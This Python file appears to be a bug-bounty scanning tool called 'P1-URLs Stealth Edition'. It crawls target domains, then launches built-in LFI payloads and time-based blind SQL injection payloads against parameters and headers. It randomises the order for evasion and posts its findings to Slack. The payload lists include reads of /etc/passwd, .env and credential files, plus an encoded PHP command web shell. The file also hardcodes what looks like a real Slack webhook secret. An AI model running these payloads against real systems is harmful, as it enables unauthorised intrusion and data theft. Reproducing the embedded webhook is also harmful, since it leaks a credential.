#!/usr/bin/env python3
"""
P1-URLs.py - Stealth Edition
with GAU, Dynamic LFI, and Randomized, Isolated Header-Based SQLi

An automated scanner to find high-impact vulnerabilities by chaining together
leading security tools and custom testing logic. It reports all findings in
real-time to Slack for immediate action.
"""

import subprocess
import argparse
import os
import re
import shutil
import sys
import time
import random
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from difflib import SequenceMatcher
from rich.console import Console
from rich.panel import Panel
import requests
import json

# ==============================================================================
# === Config ===
# ==============================================================================
SLACK_WEBHOOK = "https://hooks.slack.com/services/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" 

# File paths
COMBINED_URLS_OUTPUT = "target_combined_urls.txt"
DEDUPED_URLS = "unique_urls_filtered.txt"
GF_PATTERNS = ["lfi", "rce", "redirect", "sqli", "ssrf", "ssti", "xss"]
NUCLEI_OUTPUT_DIR = "nuclei_results"
GF_OUTPUT_DIR = "gf_results"
BLIND_SQLI_RESULTS_FILE = "blind_sqli_vulnerable.json"
LFI_RESULTS_FILE = "lfi_vulnerable.json"

# Timing and network config
TIME_DELAY = 8
REQUEST_TIMEOUT = 12
CLEAN_BASE_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Accept-Language": "en-US,en;q=0.9",
}

# Config for custom vulnerability tests
HEADERS_TO_TEST = ["User-Agent", "Referer", "X-Forwarded-For", "X-Client-IP", "X-Real-IP", "Origin", "CF-Connecting-IP"]
METHODS_TO_TEST = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]
LFI_SIMILARITY_THRESHOLD = 0.9 
LFI_CONFIDENCE_STRINGS = {
    "Linux /etc/passwd": r"root:(x|\*|\$[^:]*):0:0:",
    "Windows boot.ini": r"\[boot loader\]|\[operating systems\]",
    "PHP Wrapper successful": r"PD9waHAg"
}

# ==============================================================================
# === EMBEDDED PAYLOADS & DATA ===
# ==============================================================================
DEFAULT_LFI_PAYLOADS = [
    "../../../../../../../../etc/passwd","/etc/passwd","../../../../../../../../windows/win.ini","/windows/win.ini","c:\\boot.ini","..\\..\\..\\boot.ini","../../../../../../../../etc/passwd%00","../../../../../../../../boot.ini%00","..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd","..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd","php://filter/convert.base64-encode/resource=/etc/passwd","php://filter/resource=/etc/passwd","php://filter/read=string.rot13/resource=/etc/passwd","php://filter/zlib.decompress/convert.base64-encode/resource=/etc/passwd","pHp://filter/convert.base64-encode/resource=/etc/passwd","php://input","data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+","/var/log/apache2/access.log","/var/log/apache/access.log","/var/log/nginx/access.log","/var/log/vsftpd.log","/var/log/sshd.log",".htaccess",".htpasswd",".env","config.php","web.config","/proc/self/environ","/proc/self/cmdline","/proc/version","/proc/mounts","....//....//....//....//....//....//etc/passwd","..//..//..//..//..//..//etc/passwd","/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"
]
for i in range(2, 20): DEFAULT_LFI_PAYLOADS.extend([('../' * i) + 'etc/passwd', ('../' * i) + 'windows/win.ini', ('%2e%2e/' * i) + 'etc/passwd'])
BLIND_SQLI_PAYLOADS = {"MySQL": ["{val}' AND SLEEP({delay})-- -", "{val}\" AND SLEEP({delay})-- -", "{val}' AND SLEEP({delay}) AND ('1'='1", "{val} AND SLEEP({delay})", "{val}' AND BENCHMARK({delay}*1000000,MD5('1'))-- -", "{val} AND (SELECT * from (SELECT(SLEEP({delay})))a)", "{val}' AND IF(1=1,SLEEP({delay}),0)-- -", "{val}' XOR (SELECT * FROM (SELECT(SLEEP({delay})))a)-- -", "{val}' XOR IF(NOW()=SYSDATE(),SLEEP({delay}),0) XOR '1", "0'XOR(if(now()=sysdate(),sleep({delay}),0))OR'1", "0\"XOR(if(now()=sysdate(),sleep({delay}),0))XOR\"1", "{val}*SLEEP({delay})"], "PostgreSQL": ["';SELECT pg_sleep({delay})--", "'||(SELECT CASE WHEN (1=1) THEN pg_sleep({delay}) ELSE 'a' END)--", "'OR 1=(SELECT CASE WHEN (1=1) THEN PG_SLEEP({delay}) ELSE NULL END)--", "'AND(CASE WHEN(SUBSTRING(version(),1,1)='P') THEN(SELECT 4564 FROM PG_SLEEP({delay})) ELSE 4564 END)=4564--", "1 AND CAST(pg_sleep({delay}) AS varchar) IS NULL", "1' AND (SELECT 1)=(SELECT 1) XOR (SELECT pg_sleep({delay})) IS NULL--"], "MSSQL": ["';WAITFOR DELAY '0:0:{delay}'--", "\";WAITFOR DELAY '0:0:{delay}'--", "1';IF(1=1) WAITFOR DELAY '0:0:{delay}'--", "1' OR 1=(SELECT 1 WHERE 1=1^0); WAITFOR DELAY '0:0:{delay}'--"], "Oracle": ["{val}' AND DBMS_LOCK.SLEEP({delay})-- -", "'{val}'||DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--", "{val}' AND (SELECT 1 FROM DUAL WHERE 1=DECODE(1,1,DBMS_LOCK.SLEEP({delay}),0))>0--", "'; BEGIN DBMS_LOCK.SLEEP({delay}); END;--"]}

console = Console()

# ==============================================================================
# === Helper & Core Functions ===
# ==============================================================================

def print_banner():
    """Prints a highly animated, custom banner."""
    
    # Helper for the typewriter effect
    def typewriter_effect(text, delay=0.01):
        for char in text:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(delay)
        print()

    # Clear the screen for a clean start
    os.system('cls' if os.name == 'nt' else 'clear')
    
    console = Console()

    # --- Animation Sequence ---
    console.print("[bold cyan]Booting P1-URLs Scanner...[/bold cyan]")
    time.sleep(0.5)

    ascii_art_lines = [
        "██████╗  ██╗    ██████╗ ██████╗ ██╗     ███████╗",
        "██╔══██╗ ██║    ██╔══██╗██╔══██╗██║     ██╔════╝",
        "██████╔╝ ██║    ██║  ██║██████╔╝██║     ███████╗",
        "██╔═══╝  ██║    ██║  ██║██╔══██╗██║     ╚════██║",
        "██║      ███████╗██████╔╝██║  ██║███████╗███████║",
        "╚═╝      ╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝"
    ]
    
    console.print("\n[bold red]Initializing Mainframe...[/bold red]")
    for line in ascii_art_lines:
        console.print(f"[bold cyan]{line}[/bold cyan]", highlight=False)
        time.sleep(0.05)

    subtitle_text = "\n[yellow]Stealth Edition with Randomized, Isolated Header Testing[/yellow]\n"
    typewriter_effect(subtitle_text, delay=0.02)
    
    time.sleep(0.5)
    
    # Final, beautifully formatted panel
    final_footer = "[bold green]by bugcrowd.com/realvivek[/]  [dim]|[/]  [bold sky_blue3]x.com/starkcharry[/]"

    panel = Panel(
        "\n".join(f"[bold cyan]{line}[/bold cyan]" for line in ascii_art_lines) + subtitle_text,
        title="[bold red]P1 URLs[/]",
        subtitle=final_footer,
        subtitle_align="right",
        border_style="blue",
        padding=(1, 2)
    )

    # Final presentation
    os.system('cls' if os.name == 'nt' else 'clear')
    console.print(panel)
    time.sleep(0.5) # Pause briefly on the final panel before starting the script

def check_dependencies():
    console.print("[bold yellow][*] Checking for required tools...[/]")
    tools = ["katana", "gau", "uro", "gf", "nuclei"]
    all_found = True
    for tool in tools:
        if not shutil.which(tool):
            console.print(f"[bold red][!] Tool not found in PATH:[/] {tool}"); all_found = False
    if not all_found: console.print("[bold red][!] Please install the missing tools.[/]"); exit(1)
    console.print("[bold green][✔] All tools are installed.[/]")

def send_slack_alert(title, details, severity="CRITICAL"):
    message = (f"*{title}*\n" f"• *Severity:* `{severity}`\n")
    for key, value in details.items():
        if 'Payload' in key: message += f"• *{key}:* ```{value}```\n"
        else: message += f"• *{key}:* `{value}`\n"
    try: requests.post(SLACK_WEBHOOK, json={"text": message}, timeout=10)
    except requests.RequestException as e: console.print(f"[red]Slack alert failed: {e}[/red]")

def run_command(command, log_message, stdin_data=None):
    console.print(f"[yellow][*] {log_message}[/]")
    try: return subprocess.run(command, input=stdin_data, capture_output=True, text=True, check=False).stdout
    except FileNotFoundError: console.print(f"[bold red][!] Command not found: {command[0]}.[/]"); return None

def gather_urls(input_file, output_file):
    console.print("[bold cyan]Step 1: Gathering URLs with Katana & GAU[/]")
    with open(input_file) as f: domains = [line.strip() for line in f if line.strip()]
    with open(output_file, 'w') as out:
        for domain in domains:
            hostname = urlparse(domain).netloc
            if not hostname: continue
            out.write(run_command(["katana", "-u", domain, "-duc", "-silent", "-nc", "-jc", "-kf", "-fx", "-xhr", "-ef", "woff,css,png,svg,jpg,woff2,jpeg,gif,svg"], f"Running katana on {domain}") or "")
            out.write(run_command(["gau", "--subs", hostname], f"Running gau on {hostname}") or "")
    console.print("[bold green][✔] URL gathering complete.[/]")

def run_uro(input_file, output_file):
    console.print("[bold cyan]Step 2: Deduplicating URLs[/]")
    with open(input_file) as f: raw_urls = f.read()
    with open(output_file, "w") as out: out.write(subprocess.run(["uro"], input=raw_urls, text=True, capture_output=True).stdout)
    console.print(f"[bold green][✔] URL deduplication complete.[/]")

def run_gf(input_file, output_dir, basefile):
    console.print("[bold cyan]Step 3: Classifying URLs with GF[/]")
    with open(input_file) as f: urls_to_classify = f.read()
    for pattern in GF_PATTERNS:
        output_file, result = Path(output_dir) / f"{basefile}_{pattern}.txt", run_command(["gf", pattern], f"Running gf for pattern: {pattern}", stdin_data=urls_to_classify)
        if result and result.strip():
            with open(output_file, "w") as out: out.write(result)
            console.print(f"[green]  -> Found {len(result.splitlines())} potential '{pattern}' URLs.[/]")
    console.print("[bold green][✔] GF classification complete.[/]")

def test_lfi_dynamically(lfi_urls_file, args):
    console.print("[bold cyan]Step 4: Advanced LFI Testing (Dynamic Analysis)[/]")
    if not lfi_urls_file.exists() or lfi_urls_file.stat().st_size == 0: return
    lfi_payloads = DEFAULT_LFI_PAYLOADS
    payload_source_log = f"using {len(lfi_payloads)} built-in default payloads"
    if args.lfi_payloads:
        custom_payload_path = Path(args.lfi_payloads)
        if custom_payload_path.is_file():
            with open(custom_payload_path) as f: lfi_payloads = [line.strip() for line in f if line.strip()]
            payload_source_log = f"from custom file: {custom_payload_path}"
        else: console.print(f"[red][!] Custom LFI payload file not found. Using defaults.[/]")
    with open(lfi_urls_file) as f: urls_to_test = [line.strip() for line in f if line.strip()]
    console.print(f"[*] Testing {len(urls_to_test)} LFI URLs {payload_source_log}")
    session = requests.Session()
    for i, url in enumerate(urls_to_test):
        console.print(f"\n[bold]Testing URL ({i+1}/{len(urls_to_test)}):[/] [cyan]{url}[/]")
        try: base_resp = session.get(url, headers=CLEAN_BASE_HEADERS, timeout=REQUEST_TIMEOUT, verify=False); base_content = base_resp.text
        except requests.RequestException as e: console.print(f"  [!] Failed to get baseline for {url}: {e}"); continue
        found_for_url, parsed_url, query_params = False, urlparse(url), parse_qs(urlparse(url).query, keep_blank_values=True)
        for param in query_params:
            if found_for_url: break
            for lfi_payload in lfi_payloads:
                if found_for_url: break
                malicious_url = urlunparse(parsed_url._replace(query=urlencode({**query_params, param: lfi_payload}, doseq=True)))
                try:
                    attack_resp = session.get(malicious_url, headers=CLEAN_BASE_HEADERS, timeout=REQUEST_TIMEOUT, verify=False); attack_content = attack_resp.text
                    if SequenceMatcher(None, base_content, attack_content).ratio() < LFI_SIMILARITY_THRESHOLD:
                        for rule_name, pattern in LFI_CONFIDENCE_STRINGS.items():
                            if re.search(pattern, attack_content, re.IGNORECASE):
                                console.print(f"[bold green][✔] VULNERABLE![/] High-confidence LFI confirmed!")
                                details = {"Vulnerable URL": malicious_url, "Parameter": param, "Detection Rule": rule_name, "Payload Used": lfi_payload}
                                send_slack_alert("Vivek - LFI Vulnerability Found", details, severity="HIGH")
                                with open(LFI_RESULTS_FILE, "a") as f: f.write(json.dumps(details) + "\n")
                                found_for_url = True; break
                except requests.RequestException: pass
    console.print(f"[bold green][✔] Dynamic LFI scan complete.[/]")

def _check_sqli_vulnerability(target_url, method, headers):
    try: requests.request(method.upper(), target_url, headers=headers,
                         data={"p1":"p1"} if method.upper() in ["POST", "PUT", "PATCH"] else None,
                         timeout=(TIME_DELAY + 2), verify=False)
    except requests.exceptions.Timeout: return True
    except requests.exceptions.RequestException: pass
    return False

def test_blind_sqli(sqli_urls_file):
    console.print("[bold cyan]Step 5: Advanced Blind SQLi Testing (Evasive Edition)[/]")
    if not sqli_urls_file.exists() or sqli_urls_file.stat().st_size == 0: return
    with open(sqli_urls_file) as f: urls = [line.strip() for line in f if line.strip()]
    random.shuffle(urls)
    console.print(f"[*] Found and shuffled {len(urls)} potential SQLi URLs to test...")
    for i, url in enumerate(urls):
        console.print(f"\n[bold]Testing URL ({i+1}/{len(urls)}):[/] [cyan]{url}[/]")
        console.print("  [Phase 1] Testing URL Parameters (Standard & HPP)...")
        parsed_url = urlparse(url)
        original_params = parse_qs(parsed_url.query, keep_blank_values=True)
        if original_params:
            for param, values in original_params.items():
                is_param_vulnerable = False
                for db_name, payloads in BLIND_SQLI_PAYLOADS.items():
                    if is_param_vulnerable: break
                    for payload_template in payloads:
                        injected_payload = payload_template.format(delay=TIME_DELAY, val=(values[0] if values else ""))
                        temp_params_std, malicious_url_std = original_params.copy(), urlunparse(parsed_url._replace(query=urlencode({**original_params, param: injected_payload}, doseq=True)))
                        if _check_sqli_vulnerability(malicious_url_std, "GET", CLEAN_BASE_HEADERS):
                            details = {"URL": url, "Injection Point": f"Parameter: {param}", "Technique": "Standard", "Detected DB": db_name, "Payload Used": injected_payload}
                            send_slack_alert("Vivek - Blind SQLi Vulnerability Found", details); 
                            with open(BLIND_SQLI_RESULTS_FILE, "a") as f: f.write(json.dumps(details) + "\n");
                            is_param_vulnerable = True; break
                        malicious_url_hpp = urlunparse(parsed_url._replace(query=urlencode(list(original_params.items()) + [(param, injected_payload)], doseq=True)))
                        if _check_sqli_vulnerability(malicious_url_hpp, "GET", CLEAN_BASE_HEADERS):
                            details = {"URL": url, "Injection Point": f"Parameter: {param}", "Technique": "Parameter Pollution (HPP)", "Detected DB": db_name, "Payload Used": injected_payload}
                            send_slack_alert("Vivek - Blind SQLi Vulnerability Found", details);
                            with open(BLIND_SQLI_RESULTS_FILE, "a") as f: f.write(json.dumps(details) + "\n");
                            is_param_vulnerable = True; break
        else: console.print("    [>] No parameters in URL to test.")
        console.print("  [Phase 2] Testing HTTP Headers (Randomized & Isolated)...")
        methods_to_try = list(METHODS_TO_TEST); random.shuffle(methods_to_try)
        for method in methods_to_try:
            headers_to_try = list(HEADERS_TO_TEST); random.shuffle(headers_to_try)
            for header in headers_to_try:
                found_for_this_header = False
                for db_name, payloads in BLIND_SQLI_PAYLOADS.items():
                    if found_for_this_header: break
                    for payload_template in payloads:
                        injected_payload, headers_to_send = payload_template.format(delay=TIME_DELAY, val=""), CLEAN_BASE_HEADERS.copy()
                        headers_to_send[header] = injected_payload
                        if _check_sqli_vulnerability(url, method, headers_to_send):
                            details = {"URL": url, "Injection Point": f"Header: {header}", "Method": method, "Detected DB": db_name, "Payload Used": injected_payload}
                            send_slack_alert("Vivek - Blind SQLi Vulnerability Found", details);
                            with open(BLIND_SQLI_RESULTS_FILE, "a") as f: f.write(json.dumps(details) + "\n");
                            found_for_this_header = True; break

def run_nuclei(gf_dir, nuclei_dir, basefile):
    console.print("[bold cyan]Step 6: Scanning with Nuclei (Other Patterns)[/]")
    for pattern in GF_PATTERNS:
        if pattern in ['sqli', 'lfi']: continue
        file_path = Path(gf_dir) / f"{basefile}_{pattern}.txt"
        if not file_path.exists() or file_path.stat().st_size == 0: continue
        console.print(f"[*] Starting Nuclei scan for: [bold magenta]{pattern}[/]")
        output_path, nuclei_cmd = Path(nuclei_dir) / f"{basefile}_{pattern}_nuclei.jsonl", ["nuclei", "-l", str(file_path), "-jsonl", "-o", str(output_path), "-rate-limit", "150", "-tags", pattern, "-silent"]
        run_command(nuclei_cmd, f"Running nuclei with tag '{pattern}'")
        if output_path.exists() and output_path.stat().st_size > 0:
            with open(output_path) as f:
                for line in f:
                    try:
                        result = json.loads(line); info = result.get("info", {})
                        details = {"Vulnerability": result.get("template-id", "N/A").upper(), "URL": result.get("matched-at", "N/A"), "Template": info.get("name", "N/A")}
                        send_slack_alert("Vivek - Nuclei Vulnerability Found", details, severity=info.get("severity", "N/A").upper())
                    except (json.JSONDecodeError, KeyError): continue
    console.print("[bold green][✔] Nuclei scanning complete.[/]")

def main():
    parser = argparse.ArgumentParser(description="P1-URLs Scanner - Stealth Edition")
    parser.add_argument("-l", "--list", required=True, help="Path to a file with live subdomains")
    parser.add_argument("-p", "--lfi-payloads", help="Optional: Path to a custom LFI payloads file.")
    args = parser.parse_args()
    input_file, basefile = Path(args.list), Path(args.list).stem
    if not input_file.is_file(): console.print(f"[red][!] Input file not found:[/] {str(input_file)}"); return
    for d in [GF_OUTPUT_DIR, NUCLEI_OUTPUT_DIR]: os.makedirs(d, exist_ok=True)
    gather_urls(str(input_file), COMBINED_URLS_OUTPUT)
    run_uro(COMBINED_URLS_OUTPUT, DEDUPED_URLS)
    run_gf(DEDUPED_URLS, GF_OUTPUT_DIR, basefile)
    test_lfi_dynamically(Path(GF_OUTPUT_DIR) / f"{basefile}_lfi.txt", args)
    test_blind_sqli(Path(GF_OUTPUT_DIR) / f"{basefile}_sqli.txt")
    run_nuclei(GF_OUTPUT_DIR, NUCLEI_OUTPUT_DIR, basefile)
    console.print("\n[bold green][✔] All tasks complete! Check the results folders for logs.[/]")

if __name__ == "__main__":
    print_banner(); check_dependencies(); main()
